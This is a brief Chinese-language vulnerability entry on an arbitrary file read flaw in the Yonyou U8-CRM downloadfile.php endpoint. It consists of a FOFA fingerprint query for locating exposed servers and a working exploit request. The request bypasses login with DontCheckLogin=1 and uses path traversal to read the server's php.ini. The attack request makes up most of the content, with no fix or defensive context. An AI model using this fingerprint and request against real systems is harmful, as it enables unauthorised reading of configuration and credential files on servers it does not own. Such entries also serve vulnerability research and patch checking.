# 用友U8-CRM客户关系管理系统downloadfile.php存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`FOFA：icon_hash="1085941792" && body="/logo/images/logo.gif"`
- **请求**：`GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1`